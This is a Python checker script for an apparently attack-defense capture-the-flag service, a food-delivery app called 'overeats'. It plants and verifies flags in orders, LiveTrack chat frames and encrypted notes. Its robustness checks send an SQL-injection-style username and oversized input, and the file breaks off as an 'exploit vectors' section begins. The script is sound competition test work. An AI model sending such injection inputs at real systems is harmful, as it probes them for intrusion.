import random
import string
import struct
from typing import Optional
from logging import LoggerAdapter

import httpx
from faker import Faker

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
)
from enochecker3.utils import assert_equals, assert_in

fake = Faker()

SERVICE_PORT = 5432
INTERNAL_SECRET = "SuperSecretInternalKey2026"

checker = Enochecker("overeats", SERVICE_PORT)
app = lambda: checker.app

# ─── Helpers ───────────────────────────────────────────────────────────────────

def random_str(k: int = 12) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))

def make_username() -> str:
    return (fake.user_name()[:10] + random_str(6))[:20]

def get_client(task) -> httpx.AsyncClient:
    base = f"http://{task.address}:{SERVICE_PORT}"
    return httpx.AsyncClient(base_url=base, timeout=10.0)

# ─── HTTP helpers ──────────────────────────────────────────────────────────────

async def register_user(client, username, password, role, logger):
    logger.debug(f"[register_user] POST /api/register username={username!r} role={role!r}")
    payload = {"username": username, "password": password, "role": role}
    logger.debug(f"[register_user] request body: {payload}")
    try:
        resp = await client.post("/api/register", json=payload)
    except httpx.TimeoutException:
        logger.warning(f"[register_user] Timeout registering {username!r}")
        raise OfflineException("Timeout during register")
    except httpx.ConnectError as e:
        logger.warning(f"[register_user] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[register_user] response {resp.status_code}: {resp.text[:300]}")
    if resp.status_code == 409:
        raise MumbleException("Register collision")
    if resp.status_code != 201:
        raise MumbleException(f"Register HTTP {resp.status_code}")
    data = resp.json()
    if "token" not in data:
        raise MumbleException("Register missing token")
    logger.debug(f"[register_user] success user_id={data.get('user_id')!r}")
    return data

async def login_user(client, username, password, logger):
    logger.debug(f"[login_user] POST /api/login username={username!r}")
    try:
        resp = await client.post("/api/login", json={"username": username, "password": password})
    except httpx.TimeoutException:
        logger.warning(f"[login_user] Timeout for {username!r}")
        raise OfflineException("Timeout during login")
    except httpx.ConnectError as e:
        logger.warning(f"[login_user] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[login_user] response {resp.status_code}: {resp.text[:300]}")
    if resp.status_code != 200:
        raise MumbleException(f"Login HTTP {resp.status_code}")
    data = resp.json()
    if "token" not in data:
        raise MumbleException("Login missing token")
    logger.debug(f"[login_user] success, token length={len(data['token'])}")
    return data["token"]

async def create_restaurant(client, token, logger):
    name = fake.company()[:40]
    cuisine = random.choice(["Italian", "Chinese", "Mexican", "Japanese", "Indian", "Greek"])
    description = fake.sentence()
    logger.debug(
        f"[create_restaurant] POST /api/restaurants name={name!r} cuisine={cuisine!r} "
        f"description={description!r}"
    )
    payload = {"name": name, "cuisine": cuisine, "description": description}
    try:
        resp = await client.post(
            "/api/restaurants",
            headers={"Authorization": f"Bearer {token}"},
            json=payload,
        )
    except httpx.TimeoutException:
        logger.warning("[create_restaurant] Timeout")
        raise OfflineException("Timeout during create_restaurant")
    except httpx.ConnectError as e:
        logger.warning(f"[create_restaurant] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[create_restaurant] response {resp.status_code}: {resp.text[:300]}")
    if resp.status_code != 201:
        raise MumbleException(f"Create restaurant HTTP {resp.status_code}")
    rid = resp.json().get("restaurant_id")
    if not rid:
        raise MumbleException("Missing restaurant_id")
    logger.debug(f"[create_restaurant] success restaurant_id={rid!r}")
    return rid

async def add_menu_item(client, token, rest_id, logger):
    item_name = fake.word().capitalize()
    item_desc = fake.sentence()
    price = round(random.uniform(5.0, 20.0), 2)
    logger.debug(
        f"[add_menu_item] POST /api/restaurants/{rest_id}/menu "
        f"name={item_name!r} description={item_desc!r} price={price}"
    )
    payload = {"name": item_name, "description": item_desc, "price": price}
    try:
        resp = await client.post(
            f"/api/restaurants/{rest_id}/menu",
            headers={"Authorization": f"Bearer {token}"},
            json=payload,
        )
    except httpx.TimeoutException:
        logger.warning(f"[add_menu_item] Timeout for restaurant {rest_id!r}")
        raise OfflineException("Timeout during add_menu_item")
    except httpx.ConnectError as e:
        logger.warning(f"[add_menu_item] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[add_menu_item] response {resp.status_code}: {resp.text[:300]}")
    if resp.status_code != 201:
        raise MumbleException(f"Add menu item HTTP {resp.status_code}")
    iid = resp.json().get("item_id")
    if not iid:
        raise MumbleException("Missing item_id")
    logger.debug(f"[add_menu_item] success item_id={iid!r}")
    return iid

async def place_order(client, token, rest_id, item_id, special_instructions, logger):
    logger.debug(
        f"[place_order] POST /api/orders restaurant_id={rest_id!r} "
        f"item_id={item_id!r} qty=1 "
        f"special_instructions={special_instructions[:60]!r}"
    )
    payload = {
        "restaurant_id": rest_id,
        "items": [{"menu_item_id": item_id, "quantity": 1}],
        "special_instructions": special_instructions,
    }
    try:
        resp = await client.post(
            "/api/orders",
            headers={"Authorization": f"Bearer {token}"},
            json=payload,
        )
    except httpx.TimeoutException:
        logger.warning("[place_order] Timeout")
        raise OfflineException("Timeout during place_order")
    except httpx.ConnectError as e:
        logger.warning(f"[place_order] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[place_order] response {resp.status_code}: {resp.text[:300]}")
    if resp.status_code != 201:
        raise MumbleException(f"Place order HTTP {resp.status_code}")
    oid = resp.json().get("order_id")
    if not oid:
        raise MumbleException("Missing order_id")
    logger.debug(f"[place_order] success order_id={oid!r}")
    return oid

async def create_delivery(client, rest_token, order_id, driver_id, logger):
    logger.debug(
        f"[create_delivery] POST /api/deliveries order_id={order_id!r} driver_id={driver_id!r}"
    )
    payload = {"order_id": order_id, "driver_id": driver_id}
    try:
        resp = await client.post(
            "/api/deliveries",
            headers={"Authorization": f"Bearer {rest_token}"},
            json=payload,
        )
    except httpx.TimeoutException:
        logger.warning(f"[create_delivery] Timeout for order {order_id!r}")
        raise OfflineException("Timeout during create_delivery")
    except httpx.ConnectError as e:
        logger.warning(f"[create_delivery] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[create_delivery] response {resp.status_code}: {resp.text[:300]}")
    if resp.status_code != 201:
        raise MumbleException(f"Create delivery HTTP {resp.status_code}")
    did = resp.json().get("delivery_id")
    if not did:
        raise MumbleException("Missing delivery_id")
    logger.debug(f"[create_delivery] success delivery_id={did!r}")
    return did

# ─── LiveTrack helpers ─────────────────────────────────────────────────────────

def _make_frame(opcode: int, payload=b"") -> str:
    if isinstance(payload, str):
        payload = payload.encode()
    raw = struct.pack("!BH", opcode, len(payload)) + payload
    return raw.hex()

def _parse_frame_hex(hex_str: str):
    raw = bytes.fromhex(hex_str)
    if len(raw) < 3:
        return 0xFF, b""
    status = raw[0]
    length = struct.unpack("!H", raw[1:3])[0]
    data = raw[3:3 + length]
    return status, data

async def livetrack_raw(client, token, frames_hex, logger):
    logger.debug(
        f"[livetrack_raw] POST /api/livetrack/raw "
        f"frame_count={len(frames_hex)} opcodes={[bytes.fromhex(f)[0] for f in frames_hex]}"
    )
    try:
        resp = await client.post(
            "/api/livetrack/raw",
            headers={
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            },
            json={"frames": frames_hex},
        )
    except httpx.TimeoutException:
        logger.warning("[livetrack_raw] Timeout on /api/livetrack/raw")
        raise OfflineException("Timeout on /api/livetrack/raw")
    except httpx.ConnectError as e:
        logger.warning(f"[livetrack_raw] ConnectError: {e}")
        raise OfflineException("Cannot connect to service")
    logger.debug(f"[livetrack_raw] response {resp.status_code}: {resp.text[:400]}")
    if resp.status_code != 200:
        raise MumbleException(f"LiveTrack raw HTTP {resp.status_code}")
    raw_responses = resp.json().get("responses", [])
    parsed = [_parse_frame_hex(h) for h in raw_responses]
    logger.debug(
        f"[livetrack_raw] parsed {len(parsed)} response frames: "
        + ", ".join(f"status=0x{s:02x} data_len={len(d)}" for s, d in parsed)
    )
    return parsed

async def livetrack_chat_send(client, token, username, password, delivery_id, message, logger):
    logger.debug(
        f"[livetrack_chat_send] delivery_id={delivery_id!r} "
        f"user={username!r} msg={message[:60]!r}"
    )
    auth_frame = _make_frame(0x01, f"{username}:{password}")
    chat_frame = _make_frame(0x04, f"{delivery_id}:{message}")
    results = await livetrack_raw(client, token, [auth_frame, chat_frame], logger)
    if len(results) < 2:
        raise MumbleException(f"LT chat send frames={len(results)}")
    auth_status, auth_data = results[0]
    if auth_status != 0x00:
        raise MumbleException(f"LT auth(send) 0x{auth_status:02x}")
    chat_status, chat_data = results[1]
    if chat_status != 0x00:
        raise MumbleException(f"LT chat send 0x{chat_status:02x}")
    logger.debug("[livetrack_chat_send] success")

async def livetrack_chat_history(client, token, username, password, delivery_id, logger):
    logger.debug(
        f"[livetrack_chat_history] delivery_id={delivery_id!r} user={username!r}"
    )
    auth_frame = _make_frame(0x01, f"{username}:{password}")
    hist_frame = _make_frame(0x05, str(delivery_id).encode())
    results = await livetrack_raw(client, token, [auth_frame, hist_frame], logger)
    if len(results) < 2:
        raise MumbleException(f"LT history frames={len(results)}")
    auth_status, auth_data = results[0]
    if auth_status != 0x00:
        raise MumbleException(f"LT auth(hist) 0x{auth_status:02x}")
    hist_status, hist_data = results[1]
    if hist_status != 0x00:
        raise MumbleException(f"LT history 0x{hist_status:02x}")
    logger.debug(
        f"[livetrack_chat_history] success, history_bytes={len(hist_data)}"
    )
    return hist_data

# ─── FLAG STORE 0: Order special_instructions ──────────────────────────────────

@checker.putflag(0)
async def putflag_order(
    task: PutflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> str:
    logger.info("[putflag(0)] Starting — flag in special_instructions")
    async with get_client(task) as client:
        rest_user, rest_pass = make_username(), random_str(14)
        rest_data = await register_user(client, rest_user, rest_pass, "restaurant", logger)
        rest_token = rest_data["token"]

        cust_user, cust_pass = make_username(), random_str(14)
        cust_data = await register_user(client, cust_user, cust_pass, "customer", logger)
        cust_token = cust_data["token"]
        cust_id = cust_data["user_id"]

        rest_id = await create_restaurant(client, rest_token, logger)
        item_id = await add_menu_item(client, rest_token, rest_id, logger)

        logger.debug(
            f"[putflag(0)] Placing order with flag in special_instructions "
            f"restaurant_id={rest_id!r} item_id={item_id!r}"
        )
        order_id = await place_order(
            client, cust_token, rest_id, item_id, task.flag, logger
        )

        await db.set(
            "flagstore0",
            {
                "cust_user": cust_user,
                "cust_pass": cust_pass,
                "cust_id": cust_id,
                "order_id": order_id,
            },
        )
        logger.info(
            f"[putflag(0)] Done — order_id={order_id!r} cust_user={cust_user!r}"
        )
        return str(order_id)

@checker.getflag(0)
async def getflag_order(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    logger.info("[getflag(0)] Starting")
    try:
        d = await db.get("flagstore0")
        cust_user = d["cust_user"]
        cust_pass = d["cust_pass"]
        order_id = d["order_id"]
    except (KeyError, TypeError) as e:
        raise MumbleException("Missing putflag0 db")

    async with get_client(task) as client:
        token = await login_user(client, cust_user, cust_pass, logger)
        logger.debug(f"[getflag(0)] GET /api/orders/{order_id}/details")
        try:
            resp = await client.get(
                f"/api/orders/{order_id}/details",
                headers={"Authorization": f"Bearer {token}"},
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout fetching order details")
        logger.debug(f"[getflag(0)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 200:
            raise MumbleException(f"Get order HTTP {resp.status_code}")
        special = resp.json().get("order", {}).get("special_instructions", "")
        logger.debug(
            f"[getflag(0)] special_instructions={special[:80]!r} "
            f"(expected flag length {len(task.flag)})"
        )
        assert_in(
            task.flag.encode(), special.encode(), "Flag not found in special_instructions"
        )
        logger.info("[getflag(0)] Flag verified OK")

# ─── FLAG STORE 1: LiveTrack chat messages ─────────────────────────────────────

@checker.putflag(1)
async def putflag_chat(
    task: PutflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> str:
    logger.info("[putflag(1)] Starting — flag in LiveTrack chat")
    async with get_client(task) as client:
        rest_user, rest_pass = make_username(), random_str(14)
        rest_data = await register_user(client, rest_user, rest_pass, "restaurant", logger)
        rest_token = rest_data["token"]

        cust_user, cust_pass = make_username(), random_str(14)
        cust_data = await register_user(client, cust_user, cust_pass, "customer", logger)
        cust_token = cust_data["token"]

        drv_user, drv_pass = make_username(), random_str(14)
        drv_data = await register_user(client, drv_user, drv_pass, "driver", logger)
        drv_id = drv_data["user_id"]

        rest_id = await create_restaurant(client, rest_token, logger)
        item_id = await add_menu_item(client, rest_token, rest_id, logger)
        order_id = await place_order(
            client, cust_token, rest_id, item_id, fake.sentence()[:80], logger
        )
        delivery_id = await create_delivery(client, rest_token, order_id, drv_id, logger)

        logger.debug(
            f"[putflag(1)] Sending flag as chat message delivery_id={delivery_id!r}"
        )
        await livetrack_chat_send(
            client, cust_token, cust_user, cust_pass, delivery_id, task.flag, logger
        )

        await db.set(
            "flagstore1",
            {
                "cust_user": cust_user,
                "cust_pass": cust_pass,
                "delivery_id": delivery_id,
                "order_id": order_id,
            },
        )
        logger.info(
            f"[putflag(1)] Done — delivery_id={delivery_id!r} cust_user={cust_user!r}"
        )
        return str(delivery_id)

@checker.getflag(1)
async def getflag_chat(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    logger.info("[getflag(1)] Starting")
    try:
        d = await db.get("flagstore1")
        cust_user = d["cust_user"]
        cust_pass = d["cust_pass"]
        delivery_id = d["delivery_id"]
    except (KeyError, TypeError) as e:
        raise MumbleException("Missing putflag1 db")

    async with get_client(task) as client:
        token = await login_user(client, cust_user, cust_pass, logger)
        logger.debug(
            f"[getflag(1)] Fetching chat history delivery_id={delivery_id!r}"
        )
        chat_data = await livetrack_chat_history(
            client, token, cust_user, cust_pass, delivery_id, logger
        )
        logger.debug(
            f"[getflag(1)] history raw bytes={len(chat_data)} "
            f"preview={chat_data[:80]!r}"
        )
        assert_in(task.flag.encode(), chat_data, "Flag not found in chat history")
        logger.info("[getflag(1)] Flag verified OK")

# ─── FLAG STORE 2: Encrypted order notes (AES-CBC) ─────────────────────────────

@checker.putflag(2)
async def putflag_note(
    task: PutflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> str:
    logger.info("[putflag(2)] Starting — flag in encrypted order note")
    async with get_client(task) as client:
        rest_user, rest_pass = make_username(), random_str(14)
        rest_data = await register_user(client, rest_user, rest_pass, "restaurant", logger)
        rest_token = rest_data["token"]

        cust_user, cust_pass = make_username(), random_str(14)
        cust_data = await register_user(client, cust_user, cust_pass, "customer", logger)
        cust_token = cust_data["token"]
        cust_id = cust_data["user_id"]

        rest_id = await create_restaurant(client, rest_token, logger)
        item_id = await add_menu_item(client, rest_token, rest_id, logger)
        order_id = await place_order(
            client, cust_token, rest_id, item_id, fake.sentence()[:80], logger
        )

        logger.debug(
            f"[putflag(2)] POST /api/orders/{order_id}/notes with flag"
        )
        try:
            resp = await client.post(
                f"/api/orders/{order_id}/notes",
                headers={
                    "Authorization": f"Bearer {cust_token}",
                    "Content-Type": "application/json",
                },
                json={"note": task.flag},
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout creating encrypted note")
        logger.debug(f"[putflag(2)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 201:
            raise MumbleException(f"Create note HTTP {resp.status_code}")

        await db.set(
            "flagstore2",
            {
                "cust_user": cust_user,
                "cust_pass": cust_pass,
                "cust_id": cust_id,
                "order_id": order_id,
            },
        )
        logger.info(
            f"[putflag(2)] Done — order_id={order_id!r} cust_id={cust_id!r}"
        )
        return str(order_id)

@checker.getflag(2)
async def getflag_note(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    logger.info("[getflag(2)] Starting")
    try:
        d = await db.get("flagstore2")
        cust_user = d["cust_user"]
        cust_pass = d["cust_pass"]
        order_id = d["order_id"]
    except (KeyError, TypeError) as e:
        raise MumbleException("Missing putflag2 db")

    async with get_client(task) as client:
        token = await login_user(client, cust_user, cust_pass, logger)
        logger.debug(f"[getflag(2)] GET /api/orders/{order_id}/notes")
        try:
            resp = await client.get(
                f"/api/orders/{order_id}/notes",
                headers={"Authorization": f"Bearer {token}"},
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout fetching notes")
        logger.debug(f"[getflag(2)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 200:
            raise MumbleException(f"Get notes HTTP {resp.status_code}")
        notes = resp.json().get("notes", [])
        logger.debug(f"[getflag(2)] notes count={len(notes)}")
        if not notes:
            raise MumbleException("No notes returned for order")
        found = any(task.flag in (n.get("note", "") or "") for n in notes)
        if not found:
            raise MumbleException("Flag missing in notes")
        logger.info("[getflag(2)] Flag verified OK")

# ─── PUTNOISE / GETNOISE ───────────────────────────────────────────────────────

@checker.putnoise(0)
async def putnoise0(
    task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    noise_text = random_str(36)
    logger.info(f"[putnoise(0)] Starting — noise via special_instructions noise={noise_text!r}")
    async with get_client(task) as client:
        rest_user, rest_pass = make_username(), random_str(14)
        rest_data = await register_user(client, rest_user, rest_pass, "restaurant", logger)
        rest_token = rest_data["token"]

        cust_user, cust_pass = make_username(), random_str(14)
        cust_data = await register_user(client, cust_user, cust_pass, "customer", logger)
        cust_token = cust_data["token"]

        rest_id = await create_restaurant(client, rest_token, logger)
        item_id = await add_menu_item(client, rest_token, rest_id, logger)
        order_id = await place_order(
            client, cust_token, rest_id, item_id, noise_text, logger
        )

        await db.set(
            "noise0",
            {
                "cust_user": cust_user,
                "cust_pass": cust_pass,
                "order_id": order_id,
                "noise_text": noise_text,
            },
        )
        logger.info(f"[putnoise(0)] Done — order_id={order_id!r}")

@checker.getnoise(0)
async def getnoise0(
    task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    logger.info("[getnoise(0)] Starting")
    try:
        d = await db.get("noise0")
        cust_user = d["cust_user"]
        cust_pass = d["cust_pass"]
        order_id = d["order_id"]
        noise_text = d["noise_text"]
    except (KeyError, TypeError) as e:
        raise MumbleException("Missing noise0 db")

    async with get_client(task) as client:
        token = await login_user(client, cust_user, cust_pass, logger)
        logger.debug(f"[getnoise(0)] GET /api/orders/{order_id}/details")
        try:
            resp = await client.get(
                f"/api/orders/{order_id}/details",
                headers={"Authorization": f"Bearer {token}"},
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout in getnoise(0) order details")
        logger.debug(f"[getnoise(0)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 200:
            raise MumbleException(
                f"Getnoise(0) order details failed: HTTP {resp.status_code}"
            )
        special = resp.json().get("order", {}).get("special_instructions", "")
        logger.debug(
            f"[getnoise(0)] special_instructions={special[:80]!r} "
            f"expected noise={noise_text!r}"
        )
        assert_in(noise_text.encode(), special.encode(), "Noise text not found in order")
        logger.info("[getnoise(0)] Noise verified OK")

@checker.putnoise(1)
async def putnoise1(
    task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    noise_msg = random_str(40)
    logger.info(f"[putnoise(1)] Starting — noise via LiveTrack chat noise={noise_msg!r}")
    async with get_client(task) as client:
        rest_user, rest_pass = make_username(), random_str(14)
        rest_data = await register_user(client, rest_user, rest_pass, "restaurant", logger)
        rest_token = rest_data["token"]

        cust_user, cust_pass = make_username(), random_str(14)
        cust_data = await register_user(client, cust_user, cust_pass, "customer", logger)
        cust_token = cust_data["token"]

        drv_user, drv_pass = make_username(), random_str(14)
        drv_data = await register_user(client, drv_user, drv_pass, "driver", logger)
        drv_id = drv_data["user_id"]

        rest_id = await create_restaurant(client, rest_token, logger)
        item_id = await add_menu_item(client, rest_token, rest_id, logger)
        order_id = await place_order(
            client, cust_token, rest_id, item_id, fake.sentence()[:80], logger
        )
        delivery_id = await create_delivery(
            client, rest_token, order_id, drv_id, logger
        )

        await livetrack_chat_send(
            client, cust_token, cust_user, cust_pass, delivery_id, noise_msg, logger
        )

        await db.set(
            "noise1",
            {
                "cust_user": cust_user,
                "cust_pass": cust_pass,
                "delivery_id": delivery_id,
                "noise_msg": noise_msg,
            },
        )
        logger.info(f"[putnoise(1)] Done — delivery_id={delivery_id!r}")

@checker.getnoise(1)
async def getnoise1(
    task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter
) -> None:
    logger.info("[getnoise(1)] Starting")
    try:
        d = await db.get("noise1")
        cust_user = d["cust_user"]
        cust_pass = d["cust_pass"]
        delivery_id = d["delivery_id"]
        noise_msg = d["noise_msg"]
    except (KeyError, TypeError) as e:
        raise MumbleException("Missing noise1 db")

    async with get_client(task) as client:
        token = await login_user(client, cust_user, cust_pass, logger)
        logger.debug(
            f"[getnoise(1)] Fetching chat history delivery_id={delivery_id!r}"
        )
        chat_data = await livetrack_chat_history(
            client, token, cust_user, cust_pass, delivery_id, logger
        )
        logger.debug(
            f"[getnoise(1)] history bytes={len(chat_data)} "
            f"expected noise={noise_msg!r}"
        )
        assert_in(noise_msg.encode(), chat_data, "Noise message not found in chat history")
        logger.info("[getnoise(1)] Noise verified OK")

# ─── HAVOC ─────────────────────────────────────────────────────────────────────

@checker.havoc(0)
async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    """Health endpoint check."""
    logger.info("[havoc(0)] GET /api/health")
    async with get_client(task) as client:
        try:
            resp = await client.get("/api/health")
        except httpx.TimeoutException:
            raise OfflineException("Timeout on /api/health")
        except httpx.ConnectError as e:
            raise OfflineException("Cannot connect to service")
        logger.debug(f"[havoc(0)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 200:
            raise MumbleException(f"Health HTTP {resp.status_code}")
        body = resp.json()
        if body.get("status") != "healthy":
            raise MumbleException("Service unhealthy")
        logger.info("[havoc(0)] Health OK")

@checker.havoc(1)
async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    """Public restaurant listing."""
    logger.info("[havoc(1)] GET /api/restaurants (unauthenticated)")
    async with get_client(task) as client:
        try:
            resp = await client.get("/api/restaurants")
        except httpx.TimeoutException:
            raise OfflineException("Timeout on /api/restaurants")
        logger.debug(f"[havoc(1)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 200:
            raise MumbleException(f"Restaurants HTTP {resp.status_code}")
        data = resp.json()
        if "restaurants" not in data:
            raise MumbleException("Restaurants key missing")
        logger.info(f"[havoc(1)] Got {len(data['restaurants'])} restaurants OK")

@checker.havoc(2)
async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    """Recent orders listing."""
    logger.info("[havoc(2)] GET /api/orders/recent")
    async with get_client(task) as client:
        try:
            resp = await client.get("/api/orders/recent")
        except httpx.TimeoutException:
            raise OfflineException("Timeout on /api/orders/recent")
        logger.debug(f"[havoc(2)] response {resp.status_code}: {resp.text[:300]}")
        if resp.status_code != 200:
            raise MumbleException(f"Recent orders HTTP {resp.status_code}")
        data = resp.json()
        if "orders" not in data:
            raise MumbleException("Orders key missing")
        logger.info(f"[havoc(2)] Got {len(data['orders'])} recent orders OK")

@checker.havoc(3)
async def havoc3(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    """LiveTrack PING via /api/livetrack/ping."""
    logger.info("[havoc(3)] GET /api/livetrack/ping")
    async with get_client(task) as client:
        try:
            resp = await client.get("/api/livetrack/ping")
        except httpx.TimeoutException:
            raise OfflineException("Timeout on /api/livetrack/ping")
        except (
            httpx.ConnectError,
            httpx.ReadError,
            httpx.RemoteProtocolError,
        ):
            raise OfflineException("Connection error on /api/livetrack/ping")

        logger.debug(f"[havoc(3)] response {resp.status_code}: {resp.text[:300]}")

        if resp.status_code == 502:
            raise MumbleException("LiveTrack backend unavailable")

        if resp.status_code != 200:
            raise MumbleException(f"LT ping HTTP {resp.status_code}")

        try:
            body = resp.json()
        except ValueError:
            raise MumbleException("LT ping returned invalid JSON")

        responses = body.get("responses")
        if not isinstance(responses, list) or not responses:
            raise MumbleException("LT ping no frames")

        last = responses[-1]
        if not isinstance(last, dict):
            raise MumbleException("LT ping malformed frame")

        if last.get("status") != 0x00 and last.get("status_text") != "OK":
            raise MumbleException("LT ping failed")

        logger.info("[havoc(3)] LiveTrack PING OK")

@checker.havoc(4)
async def havoc4(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    """Register→login round-trip as customer."""
    username, password = make_username(), random_str(12)
    logger.info(f"[havoc(4)] Register+login round-trip username={username!r}")
    async with get_client(task) as client:
        reg = await register_user(client, username, password, "customer", logger)
        assert_equals("token" in reg, True, "Register did not return a token")
        token = await login_user(client, username, password, logger)
        assert_equals(len(token) > 0, True, "Login returned empty token")
        logger.info("[havoc(4)] Register+login OK")

@checker.havoc(5)
async def havoc5(task: HavocCheckerTaskMessage, logger: LoggerAdapter) -> None:
    """
    Boundary & pseudo-malicious input checks.
    Verifies service correctly rejects bad input rather than crashing or leaking data.
    """
    logger.info("[havoc(5)] Boundary / pseudo-malicious input checks")
    async with get_client(task) as client:
        # 1. Double-register same username → must get 409, not 500
        username, password = make_username(), random_str(12)
        logger.debug(f"[havoc(5)] Double-register test username={username!r}")
        await register_user(client, username, password, "customer", logger)
        try:
            resp = await client.post(
                "/api/register",
                json={"username": username, "password": password, "role": "customer"},
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout during duplicate register check")
        logger.debug(
            f"[havoc(5)] duplicate register response {resp.status_code}: {resp.text[:200]}"
        )
        if resp.status_code == 500:
            raise MumbleException("Duplicate register HTTP 500")
        if resp.status_code not in (400, 409, 422):
            raise MumbleException(f"Duplicate register HTTP {resp.status_code}")

        # 2. Login with wrong password → must get 401/403, not 200 or 500
        logger.debug(f"[havoc(5)] Wrong-password login test username={username!r}")
        try:
            resp = await client.post(
                "/api/login",
                json={"username": username, "password": "WRONG" + random_str(8)},
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout during wrong-password login check")
        logger.debug(
            f"[havoc(5)] wrong-password login response {resp.status_code}: {resp.text[:200]}"
        )
        if resp.status_code == 200:
            raise MumbleException("Wrong password accepted")
        if resp.status_code == 500:
            raise MumbleException("Wrong password HTTP 500")

        # 3. Non-restaurant account trying to create a restaurant → must be 403, not 201
        logger.debug("[havoc(5)] Non-restaurant create-restaurant test")
        cust_name, cust_pw = make_username(), random_str(12)
        cust_data = await register_user(client, cust_name, cust_pw, "customer", logger)
        cust_token = cust_data["token"]
        try:
            resp = await client.post(
                "/api/restaurants",
                headers={"Authorization": f"Bearer {cust_token}"},
                json={
                    "name": "Hacker Burgers",
                    "cuisine": "FastFood",
                    "description": "Owned by a customer account",
                },
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout during non-restaurant create-restaurant check")
        logger.debug(
            f"[havoc(5)] non-restaurant create response {resp.status_code}: "
            f"{resp.text[:200]}"
        )
        if resp.status_code == 201:
            raise MumbleException("Customer created restaurant")
        if resp.status_code == 500:
            raise MumbleException("Customer create restaurant HTTP 500")

        # 4. Unauthenticated access to a protected endpoint → must be 401, not 200 or 500
        logger.debug("[havoc(5)] Unauthenticated GET /api/orders/1/details")
        try:
            resp = await client.get("/api/orders/1/details")
        except httpx.TimeoutException:
            raise OfflineException("Timeout during unauthenticated order-details check")
        logger.debug(
            f"[havoc(5)] unauth order-details response {resp.status_code}: {resp.text[:200]}"
        )
        if resp.status_code == 200:
            raise MumbleException("Unauth order access")
        if resp.status_code == 500:
            raise MumbleException("Unauth order HTTP 500")

        # 5. SQL-injection-like special characters in username → must not crash (500)
        sqli_username = "' OR '1'='1"
        logger.debug(f"[havoc(5)] SQLi-like username register test username={sqli_username!r}")
        try:
            resp = await client.post(
                "/api/register",
                json={
                    "username": sqli_username,
                    "password": random_str(12),
                    "role": "customer",
                },
            )
        except httpx.TimeoutException:
            raise OfflineException("Timeout during SQLi-username register check")
        logger.debug(
            f"[havoc(5)] sqli register response {resp.status_code}: {resp.text[:200]}"
        )
        if resp.status_code == 500:
            raise MumbleException("SQLi username HTTP 500")

        # 6. Oversized special_instructions → must not crash (500)
        logger.debug("[havoc(5)] Oversized special_instructions test")
        token2 = await login_user(client, cust_name, cust_pw, logger)
        # We need a valid restaurant+item — reuse any from the public listing
        try:
            r_resp = await client.get("/api/restaurants")
            restaurants = r_resp.json().get("restaurants", []) if r_resp.status_code == 200 else []
        except Exception:
            restaurants = []

        if restaurants:
            rid = restaurants[0].get("id") or restaurants[0].get("restaurant_id")
            # Grab menu for first restaurant
            try:
                m_resp = await client.get(
                    f"/api/restaurants/{rid}/menu",
                    headers={"Authorization": f"Bearer {token2}"},
                )
                items = m_resp.json().get("items", []) if m_resp.status_code == 200 else []
            except Exception:
                items = []

            if items:
                iid = items[0].get("id") or items[0].get("item_id")
                big_payload = "A" * 10_000
                logger.debug(
                    f"[havoc(5)] Placing order with 10k-char special_instructions "
                    f"restaurant_id={rid!r} item_id={iid!r}"
                )
                try:
                    resp = await client.post(
                        "/api/orders",
                        headers={"Authorization": f"Bearer {token2}"},
                        json={
                            "restaurant_id": rid,
                            "items": [{"menu_item_id": iid, "quantity": 1}],
                            "special_instructions": big_payload,
                        },
                    )
                    logger.debug(
                        f"[havoc(5)] oversized special_instructions response "
                        f"{resp.status_code}: {resp.text[:200]}"
                    )
                    if resp.status_code == 500:
                        raise MumbleException("Large instructions HTTP 500")
                except httpx.TimeoutException:
                    raise OfflineException("Timeout large order")

        logger.info("[havoc(5)] All boundary/pseudo-malicious checks passed")

# ─── SHARED EXPLOIT VECTORS ────────────────────────────────────────────────────

async def _vector_header_smuggling(
    client: httpx.AsyncClient,
    attack_info: Optional[str],
